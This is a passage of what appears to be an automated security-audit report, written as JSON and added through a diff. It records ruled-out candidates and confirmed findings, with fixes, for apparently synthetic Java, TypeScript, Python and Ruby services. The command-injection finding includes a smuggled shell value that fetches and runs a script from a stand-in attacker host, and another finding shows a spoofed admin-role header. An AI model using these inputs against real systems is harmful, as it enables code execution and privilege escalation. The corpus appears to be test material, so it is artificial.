@@ -1,0 +1,1897 @@
+{
+  "provenance": {
+    "corpus": "google/mantis @ 56377ad via mantis-meta-agent",
+    "target": "/private/tmp/claude-501/-Users-cristianajavi/9d781ed3-bcf0-48ee-982b-aa1d8b6fbd34/scratchpad/corpus-v8",
+    "arm": "mantis",
+    "run": 2,
+    "stages_run": [
+      "mantis-meta-agent (supervisor; MODE-OFF: no --sync, so no active_snapshot/snapshot_history written, snapshot_pinned unset, CODE_ROOT = live target per Block A step 1d)",
+      "mantis-summarize",
+      "mantis-architecture",
+      "mantis-threat-model",
+      "mantis-plan",
+      "mantis-researcher (Wave-1 triage + Wave-2 deep dive run sequentially inline, per the skill's documented fallback when concurrency is unavailable)",
+      "mantis-dedupe",
+      "mantis-review (13 negative constraints applied as FP-01..FP-13; SNAPSHOT MODE OFF, so the Step 0c provenance gate was not run and every finding took steps 1-5)",
+      "mantis-critic",
+      "mantis-chain",
+      "mantis-calibrate",
+      "mantis-reflect",
+      "mantis-report"
+    ],
+    "stages_skipped": [
+      "mantis-history \u2014 the target has no VCS metadata (no .git/.hg/.repo anywhere under TARGET); vcs_type resolves to 'none', so there is no history to mine and historical_learnings.jsonl stays empty.",
+      "mantis-structural-index \u2014 no prebuilt SCIP/Kythe index and no compiler/ctags backend available offline across the six languages present (Java, TypeScript, Python, Ruby, JS, Firestore rules DSL). The stage is HINT-only and degrades to grep by contract, which is what the researcher used; membership was never gated on it.",
+      "mantis-reproduce \u2014 cannot run offline: no JVM/Gradle, Node/npm, Python venv, Ruby/bundler, Temporal server, Postgres, Redis or Firebase emulator, and no network to fetch them. No finding is marked reproduced; every finding below rests on static evidence read from the source.",
+      "mantis-patch \u2014 the target is read-only by instruction, so no fix was written and no post-patch validation or re-attack loop ran."
+    ],
+    "ruled_out": [
+      {
+        "assertion": "listOrdered concatenates a caller-supplied sort column straight into ORDER BY",
+        "location": "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java:42",
+        "rule": "FP-09",
+        "killed_by": "The mitigation works as written: VehicleController.java:53 resolves the query value through SORT_COLUMNS.getOrDefault, so `column` is always one of the three literals declared at VehicleController.java:35-38. No caller-controlled string reaches the concatenation."
+      },
+      {
+        "assertion": "stageBundle builds a path from a caller-supplied bundle name, so it is a path traversal",
+        "location": "fleet-telemetry/src/main/java/com/northwind/fleet/service/FirmwareService.java:32",
+        "rule": "FP-03",
+        "killed_by": "@Pattern(regexp = \"[A-Za-z0-9_.-]{1,48}\") at VehicleController.java:106 excludes '/', so the name cannot address a sibling directory. A bare '..' only names the staging parent, and Files.copy on a directory produces an empty directory \u2014 no file disclosure or overwrite is triggerable."
+      },
+      {
+        "assertion": "Wildcard CORS allowed-origins '.*' exposes authenticated telemetry to any site",
+        "location": "fleet-telemetry/src/main/resources/application.yml:13",
+        "rule": "FP-02",
+        "killed_by": "allow-credentials is false (application.yml:20) and the API authenticates with a bearer token the browser never attaches on its own, so a cross-origin page reads only what it could already fetch unauthenticated."
+      },
+      {
+        "assertion": "A negative limit reaches the SQL LIMIT clause and crashes the query",
+        "location": "fleet-telemetry/src/main/java/com/northwind/fleet/api/DiagnosticsController.java:35",
+        "rule": "FP-07",
+        "killed_by": "Math.min caps the upper bound but not the lower, so LIMIT -1 is reachable. That is a resource/availability defect with no confidentiality or integrity effect; Rule 07 excludes it because DoS resistance is not this module's stated purpose."
+      },
+      {
+        "assertion": "updateOrder interpolates customerId directly into the WHERE clause",
+        "location": "pantry-portal/server/utils/db.ts:107",
+        "rule": "FP-13",
+        "killed_by": "The value is not attacker-controlled as a string: 01.session.ts:51-54 rejects the session unless Number(claims.cid) passes Number.isInteger and is > 0, so only a JS integer ever reaches the template."
+      },
+      {
+        "assertion": "routeRules sets access-control-allow-origin '*' across the whole site including the API",
+        "location": "pantry-portal/nuxt.config.ts:20",
+        "rule": "FP-02",
+        "killed_by": "The more specific '/api/**' rule at nuxt.config.ts:24 supplies a fixed origin for every API response, so the wildcard governs only static marketing routes, which carry no credentials and no per-user data."
+      },
+      {
+        "assertion": "legacySessionFromHeader trusts an x-pantry-customer header and forges a session",
+        "location": "pantry-portal/server/middleware/01.session.ts:68",
+        "rule": "FP-01",
+        "killed_by": "The export has zero call sites in the corpus (grep across all six directories) and no request is routed through it. Its danger exists only if a future caller misuses it, which is exactly the hypothetical-misuse case Rule 01 excludes. It is not an intrinsic sink (no injection, no static secret), so the Rule 08 carve-out does not rescue it."
+      },
+      {
+        "assertion": "recent_by_panel interpolates order and limit into ORDER BY / LIMIT",
+        "location": "labtrack/labtrack/services/store.py:55",
+        "rule": "FP-09",
+        "killed_by": "Litestar validates the handler signature at results.py:46-49 before the call: order is Literal['asc','desc'] and limit is an int narrowed further by min(limit, 500). Neither can carry SQL syntax."
+      },
+      {
+        "assertion": "token_signing_key defaults to an empty string, so tokens are HMAC'd with an empty key",
+        "location": "labtrack/labtrack/settings.py:17",
+        "rule": "FP-09",
+        "killed_by": "verify_runtime_config (app.py:33-35) is registered in on_startup (app.py:49) and raises RuntimeError before the server accepts traffic. The mitigation is active and fails closed."
+      },
+      {
+        "assertion": "Shipment.where interpolates the carrier code into a SQL string",
+        "location": "dispatch-workers/app/workers/inbound_event_worker.rb:28",
+        "rule": "FP-13",
+        "killed_by": "The interpolated value is the *value* side of the CARRIER_CODES whitelist fetch (signed_payload.rb:9-15), not the payload. payload['carrier'] is only ever a lookup key, and an unmatched key returns nil and the worker returns at line 26."
+      },
+      {
+        "assertion": "ManifestRenderWorker interpolates a page argument into the SQL OFFSET",
+        "location": "dispatch-workers/app/workers/manifest_render_worker.rb:22",
+        "rule": "FP-04",
+        "killed_by": "args['page'].to_i coerces to an Integer at line 17 before the arithmetic, so the interpolated string is always a decimal integer. Flagging the stringified integer would be pedantic linting of code that is already safe."
+      },
+      {
+        "assertion": "grant_without_checks! bypasses the invite ceiling and is reachable from a worker",
+        "location": "dispatch-workers/app/workers/bulk_invite_worker.rb:20",
+        "rule": "FP-06",
+        "killed_by": "Traced rather than dismissed on the name, per Rule 06: the single call site is guarded by Rails.env.development? && rows.empty? at line 19. Rails.env is not attacker-influenced at runtime, so the branch cannot execute in a production or staging deployment."
+      },
+      {
+        "assertion": "entriesPage interpolates the page argument into the SQL OFFSET",
+        "location": "payout-orchestrator/src/activities/ledger.ts:92",
+        "rule": "FP-13",
+        "killed_by": "starter.ts:66-67 parses the raw query value with z.coerce.number().int().min(0).max(50) before calling, so a JS number reaches the template. Unlike corridorVolume, this activity is not exported through activities/index.ts, so there is no second, unvalidated caller."
+      },
+      {
+        "assertion": "The legacy schemaVersion < 2 branch submits a payout with no screening and no approval",
+        "location": "payout-orchestrator/src/workflows/payout.ts:58",
+        "rule": "FP-12",
+        "killed_by": "The branch is unreachable: assertSchemaVersion (limits.ts:29-33) is called first at payout.ts:40 and throws for every version < 2, so the condition at line 58 can never be true. Reporting it would be a hallucinated path through code that cannot execute."
+      },
+      {
+        "assertion": "The payout starter HTTP API has no authentication on money-moving endpoints",
+        "location": "payout-orchestrator/src/starter.ts:36",
+        "rule": "FP-02",
+        "killed_by": "Reported narrowly instead of broadly. The listener binds to 127.0.0.1 (starter.ts:83), so 'missing auth' on its own is the defence-in-depth gap Rule 02 excludes. What actually makes the loopback bind insufficient is the wildcard CORS header, which is reported as its own finding with the precise line that emits it."
+      },
+      {
+        "assertion": "The catalog collection is world-readable with no authentication",
+        "location": "fieldnotes/firestore.rules:24",
+        "rule": "FP-02",
+        "killed_by": "The collection holds reference data shipped with the app (hazard codes, form templates, units) and writes are denied at line 25. Public read of public reference data is the documented intent, not a confidentiality failure."
+      }
+    ]
+  },
+  "findings": [
+    {
+      "title": "SQL injection in vehicle label search",
+      "location": {
+        "path": "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java",
+        "symbol": "VehicleRepository.searchByLabel",
+        "line": 54
+      },
+      "class": "SQL injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "searchByLabel builds the statement with String.format and splices both tenantId and label into single-quoted literals, then hands the finished string to prepareStatement with no bind parameters. Its only caller, VehicleController.search (VehicleController.java:58), passes @QueryValue String label straight through with no validation. Every other query in this repository uses ? placeholders, so this is the single unparameterised read path.",
+      "impact": "Any authenticated caller can terminate the literal and append arbitrary SQL to a SELECT against the vehicles table, reading or modifying rows for every tenant, including the tenant_id predicate the rest of the service relies on for isolation.",
+      "recommendation": "Bind both values: keep 'WHERE tenant_id = ? AND label ILIKE ?' and pass the '%' + label + '%' pattern as a bound parameter, matching insert/update/delete in the same class.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Attacker control of the source is established, not assumed: the ingress point is the @QueryValue binding at VehicleController.java:58, and the value flows unmodified into the format string at VehicleRepository.java:57."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not paranoia about a safe library. prepareStatement receives an already-concatenated string, so the driver never sees a parameter to escape."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Path, method name and line verified by reading the file; searchByLabel exists at line 52 and the String.format begins at line 54."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java:54"
+        ],
+        "established_by": "Read every statement builder in VehicleRepository.java; searchByLabel is the only one that does not use bind parameters. Grepped for its callers to confirm the single ingress at VehicleController.java:58.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "Effective role is taken from a client-supplied X-Fleet-Role header",
+      "location": {
+        "path": "fleet-telemetry/src/main/java/com/northwind/fleet/security/RoleResolver.java",
+        "symbol": "RoleResolver.effectiveRole",
+        "line": 25
+      },
+      "class": "Authorization bypass / privilege escalation",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "effectiveRole reads the request header X-Fleet-Role and returns it verbatim whenever it is a member of KNOWN_ROLES, in preference to the role claim on the verified JWT. TenantFilter.java:33-35 demonstrates the design intent by explicitly stripping the sibling header X-Fleet-Tenant before trusting it \u2014 X-Fleet-Role receives no such treatment anywhere in the codebase.",
+      "impact": "A caller holding any valid token can add 'X-Fleet-Role: fleet_admin' and pass isFleetAdmin, deleting vehicles belonging to their tenant that their real role does not permit them to delete. If the edge is bypassed or misconfigured for a single route, the header reaches the service unmodified.",
+      "recommendation": "Delete the header branch and resolve the role solely from the authenticated principal, or strip X-Fleet-Role in TenantFilter alongside X-Fleet-Tenant and widen the filter to every /api/** route.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ingress point is the header read at RoleResolver.java:25; the tainted value reaches the authorization decision at VehicleController.java:79 without passing any trusted rewrite."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigation was checked pragmatically rather than assumed absent: TenantFilter.java:34 does remove X-Fleet-Tenant, and that removal is real and effective \u2014 it simply does not cover X-Fleet-Role."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical caller is required. The function itself elects the untrusted source over the trusted one."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fleet-telemetry/src/main/java/com/northwind/fleet/security/RoleResolver.java:25",
+          "fleet-telemetry/src/main/java/com/northwind/fleet/security/RoleResolver.java:35",
+          "fleet-telemetry/src/main/java/com/northwind/fleet/api/VehicleController.java:79"
+        ],
+        "established_by": "Grepped for effectiveRole and isFleetAdmin across the module; DELETE /api/vehicles/{id} at VehicleController.java:79 is the only authorization decision that consumes them.",
+        "narrowed_by": "The @Secured(\"fleet_admin\") annotation on pushFirmware (VehicleController.java:87) is evaluated by Micronaut against the JWT's roles, not through effectiveRole, so the header does not open that endpoint."
+      }
+    },
+    {
+      "title": "Diagnostics queries accept a tenant id and never apply it",
+      "location": {
+        "path": "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java",
+        "symbol": "VehicleRepository.recentFrames",
+        "line": 133
+      },
+      "class": "Cross-tenant data exposure (IDOR)",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "recentFrames declares a tenantId parameter but its SQL filters only on vehicle_id; the parameter is never referenced in the method body. openFaults at line 145 has the identical shape. Both are called from DiagnosticsController (lines 35 and 41) which dutifully resolves a tenant and passes it in, so the call sites read as though isolation is enforced.",
+      "impact": "Any authenticated caller who knows a vehicle id belonging to another tenant can read that vehicle's full OBD-II frame history and open fault codes, which carry location, operating and maintenance data for another operator's fleet.",
+      "recommendation": "Add the tenant predicate to both statements, e.g. join obd_frames to vehicles and require vehicles.tenant_id = ?, and bind the tenantId that is already being passed.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "vehicleId enters at the @PathVariable binding on DiagnosticsController.java:32 and reaches the unfiltered query directly."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The defect is inside the function: it accepts the isolation key and discards it, rather than depending on a caller behaving badly."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "code_paths are held to the two repository methods that contain the flawed statements; the controller is listed in scope as the ingress, not as the defect."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java:133",
+          "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java:146"
+        ],
+        "established_by": "Read every method in VehicleRepository.java and compared each SQL predicate against its parameter list; these two are the only ones that take tenantId without using it. listOrdered, insert, update and delete all bind it.",
+        "narrowed_by": "The caller must already know a vehicle UUID belonging to the other tenant; the vehicle listing endpoints only return ids within the caller's own tenant, so the id has to be obtained elsewhere."
+      }
+    },
+    {
+      "title": "Tenant filter does not cover the diagnostics controller",
+      "location": {
+        "path": "fleet-telemetry/src/main/java/com/northwind/fleet/security/TenantFilter.java",
+        "symbol": "TenantFilter (@Filter patterns)",
+        "line": 19
+      },
+      "class": "Missing authorization control",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The filter's pattern list is {\"/api/vehicles/**\", \"/api/depots/**\", \"/api/trips/**\"}. DiagnosticsController is mounted at @Controller(\"/api/diagnostics\") (DiagnosticsController.java:21), which matches none of them, so the filter never runs for those routes. The controller nevertheless reads request.getAttribute(\"tenantId\") at lines 34 and 40 and tolerates a null via .orElse(null) \u2014 meaning the diagnostics endpoints run with no tenant resolved and no failure.",
+      "impact": "The service-wide invariant stated in the filter's own comment ('a depot operator can never reach another operator's fleet no matter what they send') does not hold on the diagnostics routes. Combined with the unused tenantId in the repository, requests there are entirely unscoped.",
+      "recommendation": "Change the pattern to /api/** (excluding /health), and make the controllers use orElseThrow like VehicleController.tenant does, so a missing attribute fails closed instead of silently becoming null.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a missing security header or a local-only test helper. It is the absence of the primary tenant-isolation control on a live, authenticated data route."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Both the pattern list (TenantFilter.java:19) and the controller prefix (DiagnosticsController.java:21) were read directly; the mismatch is textual, not inferred."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "NOT_APPLICABLE",
+          "reason": "No test, mock or experimental path is involved; both files are production sources."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fleet-telemetry/src/main/java/com/northwind/fleet/security/TenantFilter.java:19"
+        ],
+        "established_by": "Enumerated every @Controller prefix in the module (/api/vehicles, /api/diagnostics) and matched each against the filter's three Ant patterns; /api/diagnostics is the only prefix with no matching pattern.",
+        "narrowed_by": "The routes are still behind @Secured(SecurityRule.IS_AUTHENTICATED) at DiagnosticsController.java:20, so a bearer token is required \u2014 only the tenant pinning is missing, not authentication."
+      }
+    },
+    {
+      "title": "Command injection in the firmware verifier invocation",
+      "location": {
+        "path": "fleet-telemetry/src/main/java/com/northwind/fleet/service/FirmwareService.java",
+        "symbol": "FirmwareService.verifyForDevice",
+        "line": 52
+      },
+      "class": "OS command injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The command string is assembled by concatenation and executed through ProcessBuilder(\"/bin/sh\", \"-c\", command). deviceSerial is interpolated at line 53 and is constrained only by @NotBlank (VehicleController.java:107), so shell metacharacters pass validation. bundleName in the same string is constrained by @Pattern(regexp = \"[A-Za-z0-9_.-]{1,48}\") at line 106, which shows the author knew the values land in a shell and simply missed the second one.",
+      "impact": "A caller who can reach POST /api/vehicles/{id}/firmware executes arbitrary commands as the service account on the production host, for example deviceSerial = 'x; curl -s attacker/x.sh | sh'.",
+      "recommendation": "Drop the shell: pass the verifier and its arguments as a String[] to ProcessBuilder so no interpretation occurs, and apply the same @Pattern to deviceSerial as to bundleName.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "deviceSerial enters at the @Body binding on VehicleController.java:90 and flows to the sink through firmware.verifyForDevice(..., body.deviceSerial()) at VehicleController.java:92."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigation present in this file was credited: the @Pattern on bundleName does neutralise that half of the string. The finding is confined to the parameter it does not cover."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Triggering requires no timing, grooming or unusual environment \u2014 a single well-formed request suffices once the env precondition holds."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fleet-telemetry/src/main/java/com/northwind/fleet/service/FirmwareService.java:52",
+          "fleet-telemetry/src/main/java/com/northwind/fleet/service/FirmwareService.java:55"
+        ],
+        "established_by": "Traced verifyForDevice's single call site (VehicleController.java:92) and read the record definition that supplies both arguments (VehicleController.java:106-107) to see which are constrained.",
+        "narrowed_by": "Two conditions narrow it: the shell only runs when fleet.env equals 'production' (FirmwareService.java:48), and the endpoint carries @Secured(\"fleet_admin\") (VehicleController.java:87), which Micronaut evaluates against the JWT roles rather than the spoofable X-Fleet-Role header."
+      }
+    },
+    {
+      "title": "Dead legacy purge builds a DELETE by string concatenation",
+      "location": {
+        "path": "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java",
+        "symbol": "VehicleRepository.legacyPurgeByLabel",
+        "line": 160
+      },
+      "class": "SQL injection (latent sink)",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "The method concatenates a label into 'DELETE FROM vehicles WHERE label = ...' with no bind parameter and no tenant predicate. It is private and annotated @SuppressWarnings(\"unused\"); a grep across the whole corpus returns only its own definition, so it has no callers today.",
+      "impact": "If the archive migration referenced in the comment ever wires this up, a single call deletes rows across every tenant and accepts injected SQL. As written the risk is latent rather than live.",
+      "recommendation": "Delete the method. If the migration still needs it, restore it with a bound parameter and a tenant_id predicate.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: this is a direct injection path in the function's own logic, which stays reportable even though nothing calls it."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Rule 13 carries an explicit exception for Rule 08 intrinsic flaws, so no ingress point needs to be cited."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Severity is set to low precisely because there is no trigger today; the finding is not claimed to be reproducible in the current build."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fleet-telemetry/src/main/java/com/northwind/fleet/repo/VehicleRepository.java:160"
+        ],
+        "established_by": "Grepped legacyPurgeByLabel across all six top-level directories: the definition is the only hit, and Java private visibility bounds any future caller to this file.",
+        "narrowed_by": "Private with no call sites, so no request path reaches it in the current build; it is a sink waiting for a caller, not a reachable vulnerability."
+      }
+    },
+    {
+      "title": "Billing webhook accepts unsigned events when the secret is unset",
+      "location": {
+        "path": "pantry-portal/server/api/billing/webhook.post.ts",
+        "symbol": "signatureMatches",
+        "line": 16
+      },
+      "class": "Authentication bypass (fail-open signature check)",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "signatureMatches returns true unconditionally when secret is falsy. The secret is supplied by nuxt.config.ts:9 as process.env.BILLING_WEBHOOK_SECRET ?? '', so an unset environment variable yields the empty string and the check short-circuits to 'valid' rather than failing closed. The route is also listed in OPEN_PREFIXES (01.session.ts:4), so it needs no session either.",
+      "impact": "With the variable missing in any deployment, an unauthenticated internet caller can POST charge.succeeded to move an order from draft to scheduled and set total_cents to any value (goods shipped without payment), or POST charge.refunded to cancel arbitrary orders by id.",
+      "recommendation": "Fail closed: reject the request when the secret is absent. If an emulator really needs unsigned events, gate that on an explicit allow flag that is impossible to reach by omission.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted source is the request body read at webhook.post.ts:31, which reaches the order UPDATE at line 41 once the signature branch is short-circuited."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The HMAC comparison itself is implemented correctly with timingSafeEqual and a length guard; the finding is that the mitigation is skipped entirely on the empty-secret branch, which was verified by reading the config default."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "One HTTP request reproduces it; no timing or environmental improbability is involved."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/api/billing/webhook.post.ts:16",
+          "pantry-portal/nuxt.config.ts:9"
+        ],
+        "established_by": "Read the guard, then traced config.billingWebhookSecret back to its single definition in runtimeConfig to see what value an unset variable produces.",
+        "narrowed_by": "Requires a deployment where BILLING_WEBHOOK_SECRET is unset; the '?? ' default is what makes that state silent rather than a startup failure."
+      }
+    },
+    {
+      "title": "Order creation falls back to a caller-supplied customer id",
+      "location": {
+        "path": "pantry-portal/server/api/orders/index.post.ts",
+        "symbol": "orders POST handler",
+        "line": 12
+      },
+      "class": "Broken access control / identity spoofing",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "customerId is resolved as event.context.session?.customerId ?? body.customerId. newOrderSchema (schemas.ts:8) makes customerId a required positive integer on the request body, so the fallback is always populated when the session is absent. 01.session.ts leaves context.session undefined for any request without a valid signed cookie, and it does so silently by design (see its comment at lines 18-22).",
+      "impact": "A caller with no session creates orders attributed to any customer id they choose, consuming that customer's checkout flow and reserving delivery slots against their account. Combined with the receipt path the created row is also the vehicle for the note-rendering issue reported separately.",
+      "recommendation": "Take the customer identity only from the verified session. If guest checkout must work, mint a short-lived signed guest token at the checkout step and verify that, rather than reading an integer off the body.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ingress is readBody at index.post.ts:10 via newOrderSchema.parse; body.customerId is attacker-authored and becomes the row's owner at db.ts:74."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical misuse by a caller is needed; the handler itself elects the untrusted value whenever the trusted one is missing."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is identity assignment on a write path, not a defence-in-depth omission."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/api/orders/index.post.ts:12"
+        ],
+        "established_by": "Read the schema that supplies the fallback (schemas.ts:7-20) and the session middleware that decides whether context.session exists (01.session.ts:23-61), then checked whether any gate rejects the sessionless case for this route.",
+        "narrowed_by": "The fallback only takes effect when no valid session cookie is present; a signed-in caller cannot use it to impersonate someone else."
+      }
+    },
+    {
+      "title": "Authorization middleware prefix check misses the orders collection route",
+      "location": {
+        "path": "pantry-portal/server/middleware/02.authz.ts",
+        "symbol": "authz middleware",
+        "line": 20
+      },
+      "class": "Missing authorization control",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "CUSTOMER_AREA is the string '/api/orders/' with a trailing slash, and the guard is path.startsWith(CUSTOMER_AREA). The create route is server/api/orders/index.post.ts, which Nitro serves at '/api/orders' with no trailing slash, so the comparison is false and the 401 at line 22 is never raised for it. Every /api/orders/<id> route does match, which is why the gap is invisible in normal use.",
+      "impact": "POST /api/orders is reachable with no session at all. That is the precondition that makes the customer-id fallback in the same route exploitable by an unauthenticated caller rather than only by a signed-in one.",
+      "recommendation": "Match the collection route too \u2014 compare against '/api/orders' with an exact-or-prefixed test \u2014 and prefer an explicit per-route policy over a shared string prefix.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The constant and the comparison were read at 02.authz.ts:3 and :20, and the route file path that determines the served URL was confirmed on disk at server/api/orders/index.post.ts."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The middleware is the application's only authentication gate for the customer area, not an extra hardening layer."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No adjacent bug class is being invented around a working control: the staff-area branch at line 13 is correct and is left alone."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/middleware/02.authz.ts:20"
+        ],
+        "established_by": "Enumerated the four files under server/api and derived each served path from its filename, then evaluated the startsWith predicate against each. Only '/api/orders' fails to match.",
+        "narrowed_by": "Only the collection route is uncovered. '/api/orders/[id].get.ts' and '/api/orders/[id].patch.ts' both produce paths that do start with '/api/orders/' and remain gated."
+      }
+    },
+    {
+      "title": "Per-customer order responses are served from a shared stale-while-revalidate cache",
+      "location": {
+        "path": "pantry-portal/nuxt.config.ts",
+        "symbol": "routeRules['/api/orders/**']",
+        "line": 31
+      },
+      "class": "Cache poisoning / cross-customer data exposure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The route rule applies swr: 120 to /api/orders/**. Nitro's cached handler keys entries on the request path and method; it does not vary on the session cookie, and no vary or cache-key customisation is configured here. The responses under that prefix are per-customer: [id].get.ts:8 scopes the lookup with orderForCustomer(id, session.customerId) and returns note, totalCents and shareToken.",
+      "impact": "The first customer to fetch GET /api/orders/<id> populates the cache; for the next 120 seconds any other caller requesting the same id receives that customer's order, including the share token that grants sign-in-free access. The per-customer SQL scoping at db.ts:47 is bypassed entirely because the handler never runs.",
+      "recommendation": "Remove swr for this prefix, or configure the cache to include the session identity in its key and set Cache-Control: private on the response.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The attacker-controlled input is the order id in the request path; the cross-tenant read is achieved by requesting an id whose entry another customer has already warmed."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The 120-second window is generous and repeatable \u2014 an attacker can poll continuously. Rule 03 explicitly permits low-probability races that can be retried."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The consequence is a confidentiality breach of another customer's data, not a missing hardening header."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/nuxt.config.ts:31"
+        ],
+        "established_by": "Read all four routeRules entries and matched their globs against the files under server/api. '/api/orders/**' is the only caching rule that covers session-scoped handlers; '/api/billing/**' is explicitly cache: false.",
+        "narrowed_by": "The glob matches only the /api/orders/<id> routes. POST /api/orders is outside it, and the billing webhook is explicitly excluded from caching by the rule at nuxt.config.ts:32."
+      }
+    },
+    {
+      "title": "Order note is interpolated unescaped into the receipt email",
+      "location": {
+        "path": "pantry-portal/server/utils/db.ts",
+        "symbol": "renderReceiptHtml",
+        "line": 136
+      },
+      "class": "Stored HTML/script injection",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "renderReceiptHtml escapes item.sku (line 131), order.id (line 134) and order.share_token (line 137), but interpolates order.note raw at line 136. The create path escapes the note before storing it (index.post.ts:23), but the patch path does not: [id].patch.ts:19 passes the zod-parsed patch straight to updateOrder, and db.ts:97-101 writes every supplied column verbatim. orderPatchSchema allows note as a free string up to 500 characters (schemas.ts:26).",
+      "impact": "A customer PATCHes their own order note with markup, then triggers the charge.succeeded webhook path; the mailer at webhook.post.ts:54-58 stores the rendered HTML in outbound_email and it is delivered as the receipt body. Content is attacker-controlled inside an email the business sends in its own name.",
+      "recommendation": "Escape at the sink \u2014 wrap order.note in escapeHtml at line 136 like the neighbouring fields \u2014 rather than relying on one of two write paths to sanitise on input.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ingress is readBody at [id].patch.ts:10; patch.note travels through updateOrder (db.ts:94) into the orders row and out through the unescaped interpolation."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The escapeHtml helper is correct and was credited as such; the finding is that one of the two writers into this column bypasses it, which was verified by reading both write paths."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The primary code path is the sink line; the unsanitised writer is recorded in scope rather than padding the location."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/utils/db.ts:136",
+          "pantry-portal/server/utils/db.ts:94"
+        ],
+        "established_by": "Grepped escapeHtml to find every call site, then enumerated every writer of the orders.note column: index.post.ts:23 (escaped) and updateOrder via [id].patch.ts:19 (not escaped).",
+        "narrowed_by": "Notes written through POST /api/orders are already escaped at index.post.ts:23, so only notes set or overwritten through PATCH reach the sink with live markup."
+      }
+    },
+    {
+      "title": "Share token is generated with Math.random",
+      "location": {
+        "path": "pantry-portal/server/utils/db.ts",
+        "symbol": "newShareToken",
+        "line": 40
+      },
+      "class": "Insecure randomness for a capability token",
+      "severity": "medium",
+      "status": "confirmed",
